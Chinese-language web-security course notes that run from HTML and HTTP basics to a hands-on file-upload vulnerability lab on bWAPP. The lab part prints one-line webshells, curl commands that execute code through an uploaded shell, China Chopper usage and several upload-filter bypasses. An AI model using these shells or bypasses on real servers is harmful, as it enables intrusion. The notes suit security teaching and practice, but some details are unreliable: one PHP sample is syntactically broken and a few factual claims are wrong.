# Hacker Me Web

## Web 安全基础

### HTML

#### HTML开发工具 

- Visual Studio Code
- Atom
- Sublime Text
- Vim

![1616830983487](HackerMeWeb.assets/1616830983487.png)

- 前端开发是创建Web页面或App等前端界面呈现给用户的过程。
  - HTML，CSS 及 JavaScript
- 网页制作是Web1.0时代的产物，早期网站主要内容都是静态，以图片和文字为主，用户使用网站的行为也以浏览为主。
- 随着互联网技术的发展和HTML5、CSS3 的应用，现代网页更加美观，交互效果显著，功能更加强大。 



#### HTML入门介绍 

- 为什么前后端分离？
  - 性能问题 & 学习成本
  - 将原本服务端的得计算，转移到用户端
- 前后端的走向？
  - 前端：页面表现，速度流畅，兼容性，用户体验等等
  - 后端：三高（高并发，高可用，高性能），安全，存储，业务等等 
- HTML 是什么？
  - HTML（ HyperText Markup Language）即超文本标记语言，是用来构建网页的一种语言。
  - HTML是一整套标记标签构成的标记语言，而非编程语言。
  - HTML用于承载网页的内容（文本、图片、语音、视频）。
- 通俗的讲：
  - 使用HTML标记标签与纯文本按规则构建的文档，通常也称为网页。 
- 文档—>网页
  - 浏览器通过对HTML文档解析，根据标签的顺序，按指定标签对应的规则显示纯文本内容。 



#### HTML网页结构 

- 一个标准的HTML页面由以下三个部分组成:
  - ① HTML版本声明
  - ② HTML头部
  - ③ HTML主体 

![1616831716511](HackerMeWeb.assets/1616831716511.png)

- HTML版本声明 :
  - 标签<!DOCTYPE html>
  - 它不是 HTML 标签，而是指示web 浏览器关于页面使用哪个 HTML 版本进行编写的指令。 
- HTML头部部分:
  - 标签 <head> </head>
  - 涉及页面标题、字符集、样式、链接等内容

```html
<titile> 页面标题必须存在
<base>   为所有链接指定默认地址
<link>   定义文档与外部资源之间的关系
<style>  定义样式信息
<script> 定义客户端脚本，比如 JavaScript
<meta>   定义关于 HTML 文档的元数据，用于规定页面的描述、关键词、文档的作者等。搜索引擎引擎会利meta元素的 name 和 content 属性来索引页面。 
```

- HTML主体部分：
  - 标签<body></body>
  - 浏览器展现给用户的内容，包括标题、文本、段落、链接、图片、媒体等，所有的页面内容都由HTML主体部分标签来实现。 
  - 标签之间可按照规则嵌套。 

```html
<p>hello</p>           标识一个段落
<a href=“url”>text</a> 标识一个链接文本
<ol><ul><li>           列表项相关
<table><tr><td>        表格项相关
<img>                  标识一个图片信息
<b><i>                 字体相关标签
<form><input>          表单相关标签
```



#### HTML标签/元素/属性 

- 标签
  - HTML页面由标签和内容组成，标签一般是成对出现，由开始和结束标签组成，如：


```html
<p></p>
<img/>
```

- 元素
  - HTML元素指的是开始标签到结束标签的所有代码，包括开始结束标签，如：

```html
<p>hello</p>
```

- 属性
  - 属性一般描述于开始标签中，用于对元素提供附加信息如：

```html
<img src=“image/geektime.png” width=30% height=30% alt=“图片加载失败" />
```



#### HTML练习

- github：HackerMeCode\HTML\HTMLDemo1.html
- github：HackerMeCode\HTML\HTMLDemo2.html



#### HTML学习资料

- https://developer.mozilla.org/zh-CN/docs/Web/HTML



### CSS

#### CSS入门介绍 

- 层叠样式表（英文全称：Cascading Style Sheets）是一种用来表现HTML（标准通用标记语言的一个应用）或 XML（标准通用标记语言的一个子集）等文件样式的计算机语言。
- CSS 能够对网页中元素位置的排版进行像素级精确控制，支持几乎所有的字体字号样式，拥有对网页对象和模型样式编辑的能力。 



#### CSS学习资料

- https://developer.mozilla.org/zh-CN/docs/Web/CSS



### JavaScript

#### JavaScript入门介绍 

- JavaScript是什么？
  - JavaScript，是可插入 HTML 页面，可以由绝大多数现代浏览器执行的轻量级的编程语言。
  - JavaScript 基于原型编程、多范式的动态脚本语言，并且支持面向对象、命令式和声明式（如函数式编程）风格。
- 它和Web安全有什么关系？
  - 作为一种脚本语言，由它引申出的 XSS 攻击，文件上传漏洞，常年占据 OWASP Top10。
- Node.js
  - 简单的说 Node.js 就是运行在服务端的 JavaScript。
  - Node.js 是一个基于Chrome JavaScript 运行时建立的一个平台。
  - Node.js 是一个事件驱动 I/O 服务端 JavaScript 环境，基于 Google 的 V8 引擎，V8 引擎执行 Javascript 的速度非常快，性能非常好。 
- JavaScript 功能 
  - ① 做出反应 
  - ② 改变HTML内容 
  - ③ 改变HTML样式 
  - ④ 验证输入 



#### JavaScript练习

- github：HackerMeCode\JavaScript\JavaScriptDemo.html



#### JavaScript学习资料

- JavaScript：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript
- Node.js：https://developer.mozilla.org/zh-CN/docs/Glossary/Node.js





### Web App

#### Web App是什么？

- Web App（或Web应用程序）运行于网络和标准浏览器上，基于网页技术开发实现特定功能的应用。
  - 前端：HTML，CSS，JavaScript
  - 后端：Java，Python，PHP
  - 数据库：MySQL，Oracle，MongoDB
  - 容器：Windows(IIS)，Linux(Nginx, Apache)
  - 协议：TCP，DNS，HTTP，HTTPS 
  



#### 从浏览器输入网址到看到网页，这个过程发生了什么？ 

  - 用户： 
    - 浏览器输入了一个地址 
    - 浏览器显示了一个网页 
- 显示网页的原理：
  - 客户输入URL，DNS解析URL得出IP地址，根据IP地址找出对应服务器
  - 客户机通过TCP/IP协议建立到Web服务器的TCP链接
  - 客户机向Web服务器发送HTTP请求报文，请求服务器里资源的资源文档
  - Web服务器接收到客户机的HTTP请求报文，然后向客户机发出HTTP响应报文 
  - 如果请求的是HTML文档，Web服务器会将对应目录下相应的HTML文档打开，然后将文档的响应内容发送给客户机。
  - 如果请求的是PHP文件，那么Web服务器自身是不能处理PHP动态语言脚本文件的，然后就会寻找并委托PHP应用服务器，PHP应用服务器会将Web服务器请求的PHP文件解析成HTML静态代码，然后将HTML静态代码发送给Web服务器，最后Web服务器会将HTML静态代码发送客户机。
  - 如果请求的资源是访问数据库，则Web服务器会通过PHP应用服务器去访问数据库。 
  - 客户机解析HTML静态文档
  - 客户机与服务器断开链接 



#### 常见的 Web 服务器有哪些？

  - Apache HTTP Server（简称Apache）是Apache软件基金会的一个开放源代码的网页服务器软件，可以在大多数电脑操作系统中运行，由于其跨平台和安全性被广泛使用，是最流行的Web服务器软件之一。
  - Nginx（发音同engine x）是一个网页服务器，它能反向代理HTTP, HTTPS, SMTP, POP3, IMAP的协议链接，以及一个负载均衡器和一个HTTP缓存。Nginx是一款面向性能设计的HTTP服务器，相较于Apache、lighttpd具有占有内存少，稳定性高等优势。
  - IIS是Internet Information Server的缩写。它是微软公司主推的服务器。
  - Lighttpd是一个德国人领导的开源Web服务器软件,具有非常低的内存开销、CPU占用率低、效能好以及丰富的模块等特点。
  - Tomcat是Apache软件基金会的Jakarta项目中的一个核心项目，由Apache、Sun和其他一些公司及个人共同开发而成。Tomcat技术先进、性能稳定，而且免费，因而深受Java爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web应用服务器。 

​    

#### Python实现简单服务器 

- 程序，参见：github：HackerMeCode\WebApp\python_imple_server.py
- 执行命令：python python_imple_server.py
- 不同浏览器显示了不同的控制台结果：
  - Chrome Browser
  - Firefox Browser
  - Microsoft Edge Browser



#### 什么是框架

- Web应用框架（Web application framework）是一种开发框架，用来支持动态网站、网络应用程序及网络服务的开发。其类型有基于请求的和基于组件的两种框架。
- 有助于减轻网页开发时共通性活动的工作负荷，例如许多框架提供数据库访问接口、标准样板以及会话管理等，可提升代码的可再用性。 
- 提供了某应用领域通用完备功能（除去特殊应用的部分）的底层服务的程序集合。 
  - 前端：jQuery、Bootstrap、React.js、Vue.js
  - 后端：Spring MVC、Django、Flash、Tornado



#### Python建站 

- 什么是Django 

  - Django是一个开放源代码的Web应用框架，由Python写成。
  - 采用了MTV的框架模式，即模型M（Model），视图V（View）和模版T（Template）。
  - 它最初是被开发来用于管理劳伦斯出版集团旗下的一些以新闻内容为主的网站的，即CMS（内容管理系统）软件。并于2005年7月在BSD许可证下发布。 

- 创建第一个项目 

  - 安装Django环境
    - Python –m pip install django
  - 创建第一个项目
    - django-admin startproject mysite
  - 命令行命令
    - ls -l
    - dir
    - tree ./
    - cd mysite/
  - 启动
    - python manage.py runserver 0.0.0.0:8000

- 项目文件介绍：

  - manage.py
    - Django用于管理本项目的命令行工具。
  - _\_init__.py
    - 一个普通的包初始化模块。
  - settings.py
    - Django项目的配置文件 ， 本项目引用的组件，项目名， 数据库配置， 时间、语言 ，静态文件访问地址和存储路径。
  - wsgi.py 
    - Web Server gateway interface
    - 接口信息用于服务器部署。 

- Django应用注册及建立 

  - django-admin startapp firstapp 

  - 注册 app，添加 template 路径，开放外部主机访问权限

    - mysite/settings.py

      - ```python
        ALLOWED_HOSTS = ['*']  # 允许外部主机访问
        
        INSTALLED_APPS = [
            'django.contrib.admin',
            'django.contrib.auth',
            'django.contrib.contenttypes',
            'django.contrib.sessions',
            'django.contrib.messages',
            'django.contrib.staticfiles',
            'mysite',  # 注册 mysite
        ]
        
        TEMPLATES = [
            {
                'BACKEND': 'django.template.backends.django.DjangoTemplates',
                'DIRS': [os.path.join(BASE_DIR, 'template')],  # 添加路径模板
                'APP_DIRS': True,
                'OPTIONS': {
                    'context_processors': [
                        'django.template.context_processors.debug',
                        'django.template.context_processors.request',
                        'django.contrib.auth.context_processors.auth',
                        'django.contrib.messages.context_processors.messages',
                    ],
                },
            },
        ]
        ```

  - Django应用添加URL映射关系 

    - firstapp/views.py
      - 添加函数
    - mysite/urls.py
      - 添加路径映射 URL
    - 启动应用
      - python manage.py runserver 0.0.0.0:8000
    - 访问
      - http://127.0.0.1:8000/helloworld

- 数据库迁移与创建账号 

  - 迁移数据，初始化数据表
    - python manage.py makemigrations 
    - python manage.py migrate 
  - 在mysite 目录下创建 管理员 账号 
    - python manage.py createsuperuser 
  - 启动应用
  - 访问
    - http://127.0.0.1:8000/admin/
    - 用户名：root
    - 密码：root



### HTTP协议基础 

#### HTTP协议是怎么工作的 

- HTTP协议定义了Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。
- 客户端连接到Web服务器
  - 一个HTTP客户端，通常是浏览器，与Web服务器的HTTP端口（默认为80）建立一个TCP套接字连接。
- 发送HTTP请求
  - 通过TCP套接字，客户端向Web服务器发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据 4部分组成。
- 服务器接受请求并返回HTTP响应
  - Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取。
  - 一个响应由状态行、响应头部、空行（请求空行）和响应数据（请求体）4部分组成。
- 释放连接TCP连接
  - 若connection 模式为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接。
  - 若connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求。
- 客户端浏览器解析HTML内容 



#### HTTP协议 

- 请求方法
  - GET和POST是最常见的HTTP方法，除此以外还包括DELETE、HEAD、OPTIONS、PUT、TRACE。
  - 不过，当前的大多数浏览器只支持GET和POST
- 常见的报文头的属性有很多 

![1616894719841](HackerMeWeb.assets/1616894719841.png)



#### GET vs POST 

- 从参数的传递方面来看,GET请求的参数是直接拼接在地址栏URL的后面,而POST请求的参数是放到请求体里面的。
- 从长度限制方面来看,GET请求有具体的长度限制,一般不超过1024KB,而POST理论上没有,但是浏览器一般有个界限。
- 从安全方面来看,GET请求相较于POST,因为数据都是明文显示在URL上面的,所以安全和私密性不如POST。
- 从本质上来说，GET和POST都是TCP连接，并无实质的区别。但是由于HTTP/浏览器的限定，导致它们在应用过程中体现出了一些不同。GET产生一个数据包，POST产生两个数据包。对于GET请求，浏览器会把http header 和 data 一并发出去,服务器响应200(返回数据)。而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok。 



#### HTTP请求方法和响应代码 

![1616894968238](HackerMeWeb.assets/1616894968238.png)

![1616894988927](HackerMeWeb.assets/1616894988927.png)



### Web 安全溯源 

#### Web安全的起源 

- Web应用全部都是建立在HTTP协议基础上，是对HTTP协议的实际应用。
- Web应用在实现HTTP协议的过程中，没有做足够充足强大的约束，导致攻击者能够利用其中的薄弱环节进行攻击。 

![1616895500534](HackerMeWeb.assets/1616895500534.png)



#### Web安全攻防要点 

![1616895805998](HackerMeWeb.assets/1616895805998.png)

#### Web 安全的本质是什么 

- 应用问题？
- 协议问题？
- 都不是！！！



#### 安全溯源 

- 信任问题
  - 前端输入不可信
- Web安全根本在于，Web应用在实现HTTP协议的过程中，没有做足够充足强大的约束，导致攻击者能够利用其中的薄弱环节进行攻击。 



### Web渗透工具 

#### Burp Suite 

- Burp Suite是用于攻击Web应用程序的集成平台框架。 它包含了许多Web安全相关工具， 也同时设计了接口，满足了安全人员自行拓展程序功能的需求。 
- Burp功能
  - Proxy——是一个拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。
  - Intruder——是一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。
  - Repeater——是一个靠手动操作来补发单独的HTTP 请求，并分析应用程序响应的工具。
  - Sequencer——是一个用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。
  - Decoder——是一个进行手动执行或对应用程序数据者智能解码编码的工具。
  - Comparer——是一个实用的工具，通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。 
- 下载安装
  - https://portswigger.net/burp/communitydownload
- 设置代理 
  - Proxy -> Intercept -> 关闭 Intercept is on
  - Proxy -> Options -> 本地 8080端口 
  - 浏览器：选项 -> 网络设置 -> 手动配置代理 -> HTTP 代理，端口
- 设置代理 - Mac 
  - 系统偏好设置 -> 网络 -> 高级 -> 代理 -> 网页代理（HTTP）
- 代理 - Windows 
  - 网络代理管理 -> 使用代理服务器



#### curl 

- curl 是一个功能强大灵活的网络工具，使用url的形式传输数据， 支持 HTTPS，IMAP，POP3，RTSP，SCP，FTP， FTPS，TFTP， SMTP以及SMB， Telnet等协议。
- 多用于用在抓取网页、网络监控等方面的开发，解决开发中遇到的问题。 
- Mac 自带
- windows 安装
  - https://curl.se/download.html
  - 将解压路径添加至环境变量
- 命令：
  - curl www.baidu.com
  - curl www.baidu.com -I
  - man curl
  - curl -h
  - curl ifconfig.co
  - curl ifconfig.co -v
- curl 使用场景小览 
  - -A参数指定客户端的用户代理标头，即User-Agent。
  - -b参数用来向服务器发送 Cookie。
  - -c参数将服务器设置的 Cookie 写入一个文件。
  - -d参数用于发送 POST 请求的数据体。
  - -e参数用来设置 HTTP 的标头Referer，表示请求的来源。 
  - -F参数用来向服务器上传二进制文件。
  - -G参数用来构造 URL 的查询字符串。
  - -H参数添加 HTTP 请求的标头。 



#### Postman 

- Postman是一款功能强大的网页调试与发送网页HTTP请求的工具
- 不仅可以调试简单的CSS、HTML、脚本等简单的网页基本信息，它还可以发送几乎所有类型的HTTP请求
- 可视化版本的curl
- 使用非常傻瓜，所见即所得
- 下载安装
  - https://www.postman.com/downloads/



#### HackBar 

- Firefox 浏览器插件，包含一些常用的工具。(SQL injection,XSS,加密等)，可以利用它，快速构建一个HTTP请求，或者用它快速实现某种算法等，多用于手工测试Web漏洞。 
- 安装
  - Firefox 浏览器 -> 附加组件 -> 寻找更多组件Wappalyzer -> 添加组件



#### Wappalyzer 

- Wappalyzer是一款功能强大的、且非常实用的网站技术分析插件，通过该插件能够分析目标网站所采用的平台构架、网站环境、服务器配置环境、JavaScript框架、编程语言等参数。
- 官网：https://www.wappalyzer.com/ 
- 支持平台：Firefox，Edge，Chrome
- 安装
  - 插件管理直接安装







## 后端安全

### 文件上传漏洞

#### 文件上传漏洞是什么？

- 文件上传（File Upload）是大部分Web应用都具备的功能，例如用户上传附件、改头像、分享图片等。
- 文件上传漏洞是在开发者没有做充足验证（包括前端，后端）情况下，允许用户上传恶意文件，这里上传的文件可以是木马、病毒、恶意脚本或者Webshell等。 



#### Docker 使用

- 官网
  - https://www.docker.com/
- 下载安装，并启动
- 安装成功： docker -v
- 下载 Docker 镜像
  - docker pull registry.cn-shanghai.aliyuncs.com/yhskc/bwapp 
- 启动
  - docker run -d -p 0.0.0.0:80:80 registry.cn-shanghai.aliyuncs.com/yhskc/bwapp 
- 查看启动应用
  - docker container list -a
  - docker ps
  - 关闭 容器：docker stop zealous_heyrovsky
  - 启动 已经存在的容器：docker start zealous_heyrovsky
  - 重启容器：docker restart zealous_heyrovsky



#### Webshell

- 启动 bwapp  应用
- 访问应用
  - http://127.0.0.1/login.php
- 初始化应用
  - http://127.0.0.1/install.php
  - click heren to install bWAPP
- 注册账号
  - root
  - root1234
- 登录用户
- 选择文件上传功能
  - Choose your bug: Unrestricted File Upload
  - 点击 Hack
- 编辑木马文件

```php
// shell.php

<?php @eval($_POST['hacker']); ?>
```

- 上传木马文件
  - 选择文件
  - upload
- 查看上传木马文件
  - http://127.0.0.1/images/shell.php
- 让 Webshell 执行 PHP 的 API 命令
  - get_current_user()
  - getcwd()

```sh
curl -d "hacker=echo get_current_user();" http://127.0.0.1/images/shell.php

curl -d "hacker=echo getcwd();" http://127.0.0.1/images/shell.php
```

![1617006814673](HackerMeWeb.assets/1617006814673.png)



#### 中国菜刀

- 简介：中国菜刀是一个 Webshell 集成环境 
- 下载链接
  - https://github.com/raddyfiy/caidao-official-version
  - 做 MD5 校验，杜绝黑吃黑
- 双击打开 caidao.exe --> 右键添加 SHELL --> 写入地址 与 变量 --> 双击进入服务器目录
- 右键打开 虚拟终端 --> 执行端口查询命令 $ netstat -an | grep ESTABLISHED





#### 一句话木马

- asp 一句话木马：
  - <%execute(request("value"))%> 
- php 一句话木马：
  - <?php @eval($_POST[“value”]);?> 
- aspx 一句话木马：
  - <%@ Page Language="Jscript"%>
  - <%eval(Request.Item["value"])%> 
- 其他一句话木马 
  - <%eval request("value")%>
  - <%execute request("value")%>
  - <%execute(request("value"))%> 



#### 后缀名绕过

- 设置安全等级：Set your security level: **medium**

- 上传文件: upload shell.php

  - 上传失败
  - Sorry, the file extension is not allowed. The following extensions are blocked: **asp, aspx, dll, exe, jsp, php**

- 更改文件名：upload shell.php3

  - 上传成功
  - 中国菜刀进入成功

- 更改文件名：upload shell.php30

  - 上传成功
  - 中国菜刀进入失败

- 思考：后缀名改为 .php3，尝试绕过可以，为什么 .php30 后缀不行呢？ 

- 后缀名绕过原理

  - 显示所有运行的容器：docker ps
  - 进入docker交互的shell 中：docker exec -it fffcfba80832 bash
  - 查看网络连接：netstat -antp
  - 查看网络连接并过滤80端口：netstat -antp| grep 80
  - 找到 apache2 的配置文件目录： cd /etc/apache2/
  - 查看配置文件：vim apache2.conf
  - 找到module加载配置：

  ```sh
  # Include module configuration:
  IncludeOptional mods-enabled/*.load
  IncludeOptional mods-enabled/*.conf  # 加载配置
  ```

  - 进入：cd mods-enabled
  - 找到php5.conf配置文件 ，并打开，查看源码

  ```sh
  # 根据匹配规则，可以匹配到php,php3,php4,php5,phpt,phptml
  
  <FilesMatch ".+\.ph(p[345]?|t|tml)$">  
      SetHandler application/x-httpd-php
  </FilesMatch>
  ```

  

#### 服务器关联型漏洞 

##### IIS 5.x / 6.0 解析漏洞 

- 漏洞1：当创建.asp的文件目录的时候，在此目录下的任意文件，服务器都解析为asp文件
- 漏洞2：服务器默认不解析“;”以后的内容

- 漏洞利用形式：

  - 漏洞1：www.xxx.com/xx.asp/xx.jpg 会被解析成asp文件
  - 漏洞2：www.xxx.com/xx.asp;.jpg 会被解析成为asp文件 



##### Nginx 解析漏洞 

  - 在低版本Nginx中存在一个由PHP-CGI导致的文件解析漏洞。
  - PHP的配置文件中有一个关键的选项cgi.fix_pathinfo在本机中位于php.ini配置文件中，默认是开启的。
  - 当URL中有不存在的文件时，PHP就会默认向前解析。
- 漏洞利用流程：

  1. 访问：www.xx.com/phpinfo.jpg/1.php （1.php不存在）
  2. 会解析phpinfo.jpg文件，但是按照php格式解析 



##### Apache 解析漏洞 

- Apache 在1.x和2.x版本中存在解析漏洞：
- Apache从右至左开始判断后缀，跳过非可识别后缀，直到找到可识别后缀为止，然后将该可识别后缀进解析。
- 漏洞利用流程：
  1. 上传shell.php.test；
  2. 访问shell.php.test，服务器会解析shell.php.test文件，但是按照php文件格式进行解析。 



#### 前端验证绕过 

- 很多网站、CMS 都有使用，只在前端利用 JavaScript 来做校验。
- 漏洞利用流程（两种方法都可以）：
  1. 通过Burp Suite抓包，然后修改内容后放行。
  2. 通过Chrome禁止/删除JavaScript代码。（Delete element） 





#### .htaccess绕过 

- 什么是.htaccess?
  
  - .htaccess文件（分布式配置文件）提供了一种方式，使得配置文件可以随文件夹不同而不同，其所放置的文件夹及所有子文件夹都会受此影响，其语法同apache主配置文件。
- 如何利用.htaccess?
  
  - 场景：启用了.htaccess文件的网站，使用此文件类型来绕过限制较全面的黑名单过滤。
- 思考🤔：
  1. 为什么不能绕过限制较全面的白名单过滤呢？
  2. 那么如何实操来绕过黑名单过滤呢？ 
- 漏洞利用流程:
  - 上传一个.htaccess文件，文件内容设置为【AddType application/x-httpd-php .test】。
  2. 上传一句话木马文件，文件名设置为shell.test。
  - 在浏览器中访问shell.test即可执行一句话木马。
- 思考🤔：
  
  - 为什么shell.test会成功执行呢？ 





#### 大小写绕过 

- 这是一种比较简单的绕过方式，同样针对黑名单。
- 如果我们想上传一个php木马，那么我们可以上传一个pHp即可。
- 值得思考的问题出现了🤔
  1. php真的等同于pHp吗？
  2. 如果不等同，为什么pHp可以执行呢？ 
- Windows 平台
  - 测试 echo 111 > test.txt
  - 测试 echo 222 > test.tXt
  - 由于大小写不敏感，最终只会有一个文件 test.txt，内容也会被覆盖为 222
- Linux 平台
  - 测试 echo 111 > test.txt
  - 测试 echo 222 > test.tXt
  - 大小写不敏感，文件夹中会有两个文件，内容不一样
- 关于 Linux + Apache 服务器 URL 区分大小写问题
  - linux 服务器的大小写敏感有时候很不方便，在地址栏里一定要输入准确的URL才能访问，对搜索引擎和用户不是很友好，那么如何解决linux服务器URL的大小写问题。
  - 今天同步碰到一个问题，在浏览器地址栏中输入URL地址时，必须要区分大小写才能正常访问页面，网站服务器是Linux+Apache，造成此现象的主要原因是缺少 Speling 模块，因此只要在相应的系统里加载就可以了。



#### Windows 文件流特性绕过 

- 什么是Windows文件流？
  - NTFS文件系统实现了多文件流特性，NTFS环境一个文件默认使用的是未命名的文件流，同时可创建其他命名的文件流，Windows资源管理器默认不显示出文件的命名文件流，这些命名的文件流在功能上和默认使用的未命名文件流一致，甚至可以用来启动程序。
- 我们来用Windows平台做一些测试：
  1. Echo 111 > test.txt:111.txt
     1. 使用命名的文件流111.txt创建文件 test.txt
     2. 直接打开，文件中没有数据，查看属性0字节
     3. 使用 notepad test.txt:111.txt 打开可以看到内容
  2. Echo test > test.txt；
     1. 使用默认的文件流创建文件 test.txt
     2. 文件中的数据变成 test
     3. 查看属性7字节
  3. Echo 222 > test.txt::$data；
    1. 使用默认的文件流，:$data，创建文件 test.txt
    2. 直接打开，看到数据，查看属性6字节
- 说明了哪些问题？
- 我们又该如何利用这个漏洞进行绕过及Webshell上传呢？ 





#### %00 截断绕过

- 可以看到黑名单会存在巨大的被绕过的风险，无论是服务器原因还是操作系统原因，那么白名单是否完全安全呢？ 

  - 还是不安全啊

- 首先来看一下substr是做什么的？ 

  ```php
  <? php
  $is_upload = false;
  $msg = null;
  if(isset($_POST['submit'])){
      $ext_arr = array('jpg', 'png', 'gif');
      $file_ext = substr($_FILES['upload_file']['name'], strrpos($_FILES['upload_file']['name'], ".")+1);
      if(in_array($file_ext, $ext_arr)){
          $temp_file = $_FILES['upload_file']['tmp_name'];
          $img_path = $_POST['save_path']."/".rand(1, 99).date("YmdHis" ).".".$file_ext;
          if(move_uploaded_file($temp_file,$img_path)) {
              $is_upload = true;
          }else {
              $msg = "上传失败";
          }else {
              $msg ="只允许上传.jpg|.png|.gif类型文件! ";
          }
      }
  }
      
  ?>
  ```

- 可以看出代码采用的白名单校验，只允许上传图片格式，理论上这个上传是不好绕过的。

- 但是后面采用保存文件的时候，是路径拼接的形式，而路径又是从前端获取，所以我们可以采用在路径上截断。 

- 漏洞利用流程:

  - 设置save_path=../upload/a.php%00
  2. 上传一个内容为一句话木马的jpg文件 

- 测试流程

  - cp shell.php shell.php.jpg
  - 上传shell.php.jpg
  - 使用 burp Suite，打开 Intercept is on, 拦截上传文件的请求
  - 改shell.php.jpg 为shell.png .jpg，选中png后面的空格，在右边栏更改原始20code为00，并且应用
  - 此时鼠标的光标在g后面就有一个间隔位置，点击Forward
  - 关闭 Intercept is off，此时上传文件成功 



#### 文件头检测绕过 

- 常见文件头格式
  - png/jpg/gif

![1617074739806](HackerMeWeb.assets/1617074739806.png)

- 拼接png与php文件，尝试执行 
  - 复制一份：cp test.png test2.png
  - php内容添加到png后面：cat test.php >> test2.png
  - php 可以执行新文件：php test2.png



#### 文件上传绕过类型

- Content-Type绕过 
- 前端绕过
- 文件解析规则绕过
- windows 环境特性绕过
- 大小写、双写、点空格、文件头、条件竞争绕过



#### 源码审计

- 使用bWAPP将security level 设置为 High

  - 尝试直接上传，失败。
  - 尝试修改文件后缀，失败。
  - 可以看出是基于白名单，那么是否可以采用截断方式呢？ 
    - 不可以，我们要理解截断方式可以生效的根本原因是什么：
    - 是我们可以 分别控制 存储路径 及 文件名称
    - 这样我们才可以实现通过文件名称校验的同时存储为php文件 

- 验证一下是否符合我们的思路之代码审计 

  - 显示所有运行的容器：docker ps

  - 进入docker交互的shell 中：docker exec -it fffcfba80832 bash

  - 查看网络连接：netstat -antp

  - 查看网络连接并过滤80端口：netstat -antp| grep 80

  - 找到 apache2 的配置文件目录： cd /etc/apache2/

  - 查看配置文件：vim apache2.conf，从配置文件中找到web根目录 

    ```php
    <Directory /var/www/>
            Options Indexes FollowSymLinks
            AllowOverride None
            Require all granted
    </Directory>
    ```

  - 进入 web 目录，cd /var/www/html，通过Vim查看unrestricted_file_upload.php这个文件 

    ```php
    include("security.php");
    include("security_level_check.php");
    include("functions_external.php");  // 链接进来的文件中包含执行的 file_upload_check_1 和 file_upload_check_2 方法
    include("selections.php");
    
     switch($_COOKIE["security_level"])  // 根据 $_COOKIE 中的security_level数组，判断执行的方法
        {
    
            case "0" :
                    echo "test";
                move_uploaded_file($_FILES["file"]["tmp_name"], "images/" . $_FILES["file"]["name"]);
                break;
    
            case "1" :
                $file_error = file_upload_check_1($_FILES["file"]);
                break;
    
            case "2" :
    
                $file_error = file_upload_check_2($_FILES["file"], array("jpg","png"));
                break;
    
            default :
                move_uploaded_file($_FILES["file"]["tmp_name"],"images/" . $_FILES["file"]["name"]);
                break;
    
        }
    ```

  - 进入functions_external.php文件，追踪定位到关键函数——file_upload_check_2() 

    ```php
    function file_upload_check_2($file, $file_extensions  = array("jpeg", "jpg", "png", "gif"), $directory = "images")
    {
        ...
         // Breaks the file in pieces (.) All pieces are put in an array
        $file_array = explode(".", $file["name"]);
        // Puts the last part of the array (= the file extension) in a new variabele
        // Converts the characters to lower case
        $file_extension = strtolower($file_array[count($file_array) - 1]);
        // Searches if the file extension exists in the 'allowed' file extensions array  // 白名单
        if(!in_array($file_extension, $file_extensions))
        {
           $file_error = "Sorry, the file extension is not allowed. Only the following extensions are allowed: <b>" . join(", ", $file_extensions) . "</b>";
           return $file_error;
        }
    }
    ```

  - 确认逻辑代码安全性 & 通过php API reference来确认关键函数调用安全性 

    - explode（）

      ![1617082126465](HackerMeWeb.assets/1617082126465.png)

    - in_array（）

      ![1617082147475](HackerMeWeb.assets/1617082147475.png)

  - 可以发现由于PHP语言的特性，in_array()函数调用使用了默认的松散比较 

    - 松散比较会出现问题的情况

      ![1617082199229](HackerMeWeb.assets/1617082199229.png)

  - 通过源码审计，我们可以发现我们无法同时满足以下两个条件：
    1. 保证上传的文件名类型满足jpg/png；
    2. 保证存储的文件名为php/php3等类型；

  - 因此该文件上传点我们无法直接利用。 

- 漏洞链 

  - 那么我们该如何利用这个文件上传漏洞呢？
  - 答案是通过漏洞之间的联合利用，基于我们已经成功上传一句话木马内容的jpg，联合使用本地/远程文件包含漏洞，既可以完成本次渗透。 



#### Fuzz 

- 模糊测试
  - 模糊测试（fuzz testing, fuzzing）是一种软件测试技术。
  - 其核心思想是将自动或半自动生层的随机数据输入到一个程序中，并监视程序异常，如崩溃，断言（assertion）失败，以发现可能的程序错误，比如内存泄漏。模糊测试常常用于检测软件或计算机系统的安全漏洞。
  - 模糊测试最早由威斯康星大学的Barton Miller 于1988年提出，他们的工作不仅使用随机无结构的测试数据，还系统的利用了一系列的工具去分析不同平台上的各种软件，并对测试发现的错误进行了系统的分析。此外，他们还公开了源代码，测试流程以及原始结果数据。
  - link：https://zh.wikipedia.org/wiki/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95
- Web 安全与 Fuzz
  - 使用 Burp Suite 进行 Fuzz 的使用
  - 设置上传的security level: **medium**，随便上传一个文件
  - 在Burp中找到上传失败的 HTTP ，右键 send to Intruder
  - 进入 Intruder 选项，点击 Postions ，在内部选择自己测试的部分，删除其他的 § 符号
  - 点击Payload，在 Payload Options[Simple list] 中，添加 new Item，如：txt，php，php3 等，可以积累一个自己的字典。
  - 点击 Start attack，弹出请求与响应的页面
  - 可以通过 Length 确定每一个响应的内容是什么，并进行比对
- 注意事项 
  - 模糊测试（fuzz testing)和渗透测试（penetration test）都是属于安全测试的方法，它们有同也有异，渗透测试一般是模拟黑客恶意入侵的方式对产品进行测试，对测试者的执行力要求很高，成本高，难以被大规模应用；而模糊测试，它能够充分利用机器本身，随机生成和发送数据；与此同时，又能够引进业内安全专家在安全性方面的建议。
  - 使用过程有几点需要注意：
    1. Fuzz过程由于会产生大量异常输入，未经人工分析，可能造成生产环境崩溃。
    2. Fuzz过程会产生大量负载，可能会对生产环境造成影响。
    3. 安全监测过程中很容易由于过多访问触发安全警报，进而为后续安全检测制造障碍。
  - 因此Fuzz多用于非生产环境，在生产环境使用要十分慎重。 



#### 防御措施 

